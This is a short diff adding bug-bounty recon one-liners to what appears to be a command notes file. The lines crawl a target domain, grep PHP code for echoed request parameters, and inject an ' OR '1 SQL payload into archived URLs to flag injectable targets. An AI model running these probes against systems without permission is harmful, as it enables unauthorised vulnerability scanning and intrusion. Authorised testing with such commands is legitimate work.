@@ -2,6 +2,11 @@
 
 
 
+gospider -d 0 -s "https://DOMAIN" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew spider1
+
+grep -r "echo.*\$_\(GET\|REQUEST\|POST\)"
+
+cat wayb/wb.txt| grep "=" | qsreplace "' OR '1" | httpx -silent -response-in-json -json | tee -a sql.tmp ; grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
 
 awk 'FNR==NR {a[$0]++; next} !($0 in a)' test.txt test2.txt
 
